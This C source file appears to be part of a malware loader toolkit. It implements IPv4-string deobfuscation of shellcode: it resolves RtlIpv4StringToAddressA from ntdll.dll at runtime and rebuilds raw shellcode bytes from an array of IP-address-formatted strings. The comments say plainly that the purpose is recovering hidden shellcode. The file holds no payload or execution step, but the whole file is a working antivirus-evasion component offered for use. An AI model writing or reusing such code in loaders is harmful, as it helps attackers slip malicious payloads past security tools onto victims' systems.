#include "encoders.h"


typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(
        PCSTR                   S,
        BOOLEAN                 Strict,
        PCSTR*                  Terminator,
        PVOID                   Addr
);


BOOL Ipv4Deobfuscation(IN CHAR * Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {
        PBYTE           pBuffer         = NULL, TmpBuffer = NULL;
        SIZE_T          sBuffSize       = 0;
        PCSTR           Terminator      = NULL;
        NTSTATUS        STATUS          = STATUS_SUCCESS;
        
        // getting RtlIpv4StringToAddressA address from ntdll.dll
#ifdef UNICODE
        fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlIpv4StringToAddressA");
#else
        fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlIpv4StringToAddressA");
#endif
        if (pRtlIpv4StringToAddressA == NULL) {
                DebugPrint("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
                return FALSE;
        }
        // getting the real size of the shellcode (number of elements * 4 => original shellcode size)
        sBuffSize = NmbrOfElements * 4;
        // allocating mem, that will hold the deobfuscated shellcode
        pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
        if (pBuffer == NULL) {
                DebugPrint("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
                return FALSE;
        }
        // setting TmpBuffer to be equal to pBuffer
        TmpBuffer = pBuffer;
        
        
        // loop through all the addresses saved in Ipv4Array
        for (int i = 0; i < NmbrOfElements; i++) {
                // Ipv4Array[i] is a single ipv4 address from the array Ipv4Array
                if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
                        // if failed ...
                        DebugPrint("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv4Array[i], STATUS);
                        return FALSE;
                }
                
                // tmp buffer will be used to point to where to write next (in the newly allocated memory)
                TmpBuffer = (PBYTE)(TmpBuffer + 4);
        }
        
        *ppDAddress = pBuffer;
        *pDSize = sBuffSize;
        return TRUE;
}